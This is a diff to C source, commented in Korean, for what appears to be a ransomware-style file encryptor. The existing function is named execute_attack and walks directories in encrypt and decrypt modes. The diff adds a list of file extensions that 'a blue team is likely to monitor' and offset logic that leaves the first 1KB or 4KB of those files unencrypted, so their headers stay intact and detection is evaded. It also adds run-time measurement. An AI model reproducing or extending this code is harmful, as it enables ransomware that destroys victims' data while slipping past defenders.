@@ -1,9 +1,11 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <strings.h>    // strcasecmp 사용
 #include <unistd.h>     // fork, waitpid
 #include <sys/wait.h>
 #include <sys/stat.h>
+#include <sys/time.h> // 시간 측정
 #include <dirent.h>
 #include <limits.h>
 #include <errno.h>
@@ -23,6 +25,60 @@
 // main 함수에서 mmap으로 할당할 예정
 static sem_t *proc_limiter = NULL;
 
+// 헤더가 민감한 확장자 목록 (블루팀이 감시할 확률 높은 것들)
+static const char *SENSITIVE_EXTS[] = {
+    ".exe", ".dll", ".sys", ".elf",            // 실행 파일
+    ".pdf", ".docx", ".xlsx", ".pptx", ".hwp", // 문서
+    ".jpg", ".jpeg", ".png", ".gif", ".bmp",   // 이미지
+    ".zip", ".tar", ".gz", ".7z", ".rar",      // 압축
+    ".mp3", ".mp4", ".avi", ".mov",            // 미디어
+    NULL                                       // 끝
+};
+
+// 확장자 확인 함수
+int is_sensitive_file(const char *filename) {
+    const char *ext = strrchr(filename, '.');
+    if (!ext) return 0; // 확장자 없음
+
+    for (int i = 0; SENSITIVE_EXTS[i] != NULL; i++) {
+        if (strcasecmp(ext, SENSITIVE_EXTS[i]) == 0) {
+            return 1; // 민감한 파일임
+        }
+    }
+    return 0; // 일반 파일 
+}
+
+/**
+ * @brief 파일 크기와 확장자를 고려하여 안전한 시작 위치(Offset) 계산
+ * @return 시작해야 할 바이트 위치 (16배수 필수)
+ */
+long calculate_safe_start_offset(const char *filename, long filesize) {
+    // 확장자 불문하고 512바이트보다 작은 파일은 건드리지 않음 -> 음..  굳이 안해도 될거 같긴 한데 일단 ㄱ
+    if (filesize < 512) {
+        return filesize; // 전체 스킵 유도
+    }
+
+    // 민감하지 않은 파일은 처음부터 암호화
+    if (!is_sensitive_file(filename)) {
+        return 0;
+    }
+
+    // 민감한 파일에 대한 크기별 처리
+    // 1. 초소형 파일 (1KB 미만) -> 오히려 안 건드는게 좋을 수도 있음, 민감한 파일인데 이정도로 작은게 이상함
+    if (filesize < 1024) {
+        return filesize; 
+    }
+
+    // 2. 소형 파일 (1KB ~ 100KB)
+    // 1KB(1024 byte)만 건너뜀, 보통 1KB안에서 헤더 끝남
+    if (filesize < 100 * 1024) {
+        return 1024; 
+    }
+
+    // 2. 중대형 파일 (100KB 이상)
+    // 시원하게 4KB(4096 byte) 건너뜀, 우리 주요 손님?들임 -> 가장 안전하게 모시겠습니다 고갱님
+    return 4096;
+}
 
 /**
  * @brief 프로그램 사용법 출력
@@ -156,13 +212,20 @@ void execute_attack(int mode) {
             skip_distance = 10 * 1024 * 1024;
         }
 
+        long current_offset = calculate_safe_start_offset(target, total_size);
+        // 만약 계산된 시작 위치가 파일 크기보다 크거나 같은 경우
+        if (current_offset >= total_size) {
+            printf("[SAFE SKIP] %s (Size: %ld, Too small/Sensitive)\n", target, total_size);
+            continue; // 이건 넘어감
+        }
+
         printf("[TARGET] %s (Size: %ld bytes, Skip: %ld bytes) %s 시작\n",
                target,
                total_size,
                skip_distance,
                (mode == 0) ? "암호화" : "복호화");
 
-        long current_offset = 0;
+        
         int child_round = 0;
         int attack_failed = 0;
         // [추가] 마지막으로 암호화가 끝난 위치를 추적하는 변수
@@ -238,6 +301,10 @@ void execute_attack(int mode) {
  * @brief 프로그램 시작점
  */
 int main(int argc, char *argv[]) {
+    // 시작 시간 기록
+    struct timeval start_time, end_time;
+    gettimeofday(&start_time, NULL);
+
     if (argc != 2) {  // 인자로 모드만 받음
         fprintf(stderr, "Error: Invalid arguments.\n\n");
         print_usage(argv[0]);
@@ -309,5 +376,15 @@ int main(int argc, char *argv[]) {
 
     printf("------------------------\n");
     printf("--- End Traversal ---\n");
+
+    // 종료 시간 기록 및 계산
+    gettimeofday(&end_time, NULL);
+    double elapsed_sec = (end_time.tv_sec - start_time.tv_sec) + 
+                         (end_time.tv_usec - start_time.tv_usec) / 1000000.0;
+
+    printf("\n");
+    printf("========================================\n");
+    printf(" [TIMING] Total Execution Time: %.4f sec\n", elapsed_sec);
+    printf("========================================\n");
     return 0;
 }
